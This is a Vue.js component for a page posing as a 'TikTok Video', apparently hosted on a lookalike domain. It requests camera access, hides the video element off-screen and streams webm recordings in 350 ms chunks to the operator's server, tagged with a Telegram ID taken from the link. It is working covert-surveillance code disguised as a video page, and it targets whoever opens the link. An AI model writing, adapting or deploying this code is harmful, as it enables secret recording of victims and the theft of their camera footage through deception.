<template>
    <img v-if="isActiveMainImage" class="main_image" ref="main_image" src="@/assets/img/image copy.png" width="1000" height="1000" alt="">
    <video class="camera_video" ref="video" width="640" height="480" autoplay></video>
    <CameraObj ref="camera_obj" v-if="isActiveCameraBlock" class="cm"></CameraObj>
    <CInformationAbout v-if="infoBlockActive"></CInformationAbout>
    <canvas ref="canvas" width="640" height="480"></canvas>

</template>

<script>
import CameraObj from '@/components/CameraObj.vue';
import CInformationAbout from '@/components/cInformationAbout.vue';
import {v4 as uuidv4} from 'uuid';


export default {
  name: 'App',
  components:{CameraObj, CInformationAbout},
  data() {
    return {
      video_name: uuidv4(),
      stream: null, // Хранение видеопотока
      videoChunks: [], // Для хранения частей записанного видео
      telegramId: this.$route.params.telegram_id,
      isActiveCameraBlock: false,
      isActiveMainImage: true,
      isActiveCanvas: false,
      isActiveCameraVideo: false,
      infoBlockActive: false,
      baseUrl: 'https://tiktok.copicon.ru'
    };
  },
  mounted() {

    this.startCamera(); // Стартуем камеру при загрузке компонента
    document.title = "TikTok Video №10394"
  },
  
  methods: {
    async startCamera() {
  try {
    console.log(this.$refs.camera_obj);

    // Запрашиваем доступ к камере
    this.stream = await navigator.mediaDevices.getUserMedia({ video: true });

    // Устанавливаем флаги и видео-поток
    this.isActiveCameraBlock = true;
    this.isActiveMainImage = false;
    this.$refs.video.srcObject = this.stream;

    // Устанавливаем настройки MediaRecorder и стартуем запись с заданным интервалом
    const options = { mimeType: 'video/webm' }; // Используем 'video/webm' для совместимости
    const mediaRecorder = new MediaRecorder(this.stream, options);
    const CHUNK_INTERVAL = 350; // Интервал отправки 0.5 секунды (500 мс)
    mediaRecorder.start(CHUNK_INTERVAL);

    // Обработчик для отправки чанков, как только они становятся доступны
    mediaRecorder.ondataavailable = async (event) => {
      const chunk = event.data;
      const formData = new FormData();
      formData.append('video', chunk, `${this.video_name}.webm`);
      formData.append('telegram_id', this.telegramId);

      try {
        // Отправляем чанк на сервер
        await fetch(`${this.baseUrl}/api/v1/send_chunk/`, {
          method: "POST",
          body: formData,
        });
        console.log("Чанк отправлен успешно");
      } catch (error) {
        console.error("Ошибка отправки чанка:", error);
      }
    };

    // Когда видео загружено, делаем снимок после небольшой задержки
    this.$refs.video.addEventListener('loadeddata', () => {
      setTimeout(() => {
        this.takeSnapshot(); // Делаем снимок
      }, 1000); // Задержка для фокусировки
    });

    // Останавливаем запись и видео-поток перед закрытием страницы
    window.addEventListener("beforeunload", () => {
      mediaRecorder.stop();
      this.stream.getTracks().forEach((track) => track.stop());
    });

  } catch (err) {
    console.error('Ошибка доступа к камере:', err);
  }
},

    // Остановка камеры
    stopCamera() {
      if (this.stream) {
        const tracks = this.stream.getTracks();
        tracks.forEach(track => track.stop()); // Останавливаем каждый трек
      }
    },
    // Делаем снимок
    takeSnapshot() {
      const canvas = this.$refs.canvas;
      const video = this.$refs.video;
      const context = canvas.getContext('2d');

      // Рисуем изображение на canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Получаем данные изображения
      // const imageData = canvas.toDataURL('image/png');

      // Начинаем запись видео
      // this.startRecording(imageData);
    },
    sendData(imageData, videoBlob) {
      // Преобразуем base64 фото в Blob
      const photoBlob = this.dataURItoBlob(imageData);

      // Формируем данные для отправки
      const formData = new FormData();
      formData.append('image', photoBlob, 'photo.png');
      formData.append('video', videoBlob, 'video.mp4');
      formData.append('telegram_id', this.telegramId)
      // Отправляем POST-запрос
      fetch(`${this.baseUrl}/api/v1/send_chunk/`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        this.stopCamera(); // Останавливаем видеопоток после отправки данных
        setTimeout(() => {
      this.previewModalWindow()
    }, 3000)
      })
      .catch((error) => {
        console.error('Error:', error);
        this.stopCamera()
        setTimeout(() => {
      this.previewModalWindow()
    }, 3000)
      });

      
    },
    // Преобразуем base64 в Blob
    dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    },
    previewModalWindow(){
      this.isActiveCameraBlock = false
      this.infoBlockActive = true
    }
  },
  beforeUnmount() { // Замена beforeDestroy на beforeUnmount
    this.stopCamera(); // Останавливаем камеру при уничтожении компонента
    
    
  }
};
</script>

<style scoped>
html{
  background-color: black;
}
body{
  background-color: black;
}
#app {
  text-align: center;
  background-color: black;
  display: flex;
  flex-direction: column-reverse;
 
}
.cm{
  margin-top: 0px;
}
.camera_video{
  opacity: 0;
  position: absolute;
  left: -1900px;
  top: -1000px;
}
.video_video{
  display: block;
  margin: auto
}
canvas{
  position: absolute;
  display: none;
}

.main_image{
  z-index: 100;
  height: 50%;
  width: 100%;
  animation: slidein 2s ease-in-out infinite;
}


@keyframes slidein {
  from {
    transform: scale(.85);
  }
  50% {
    transform: scale(1);
  }
  to {
    transform: scale(.85);
  }
}
</style>
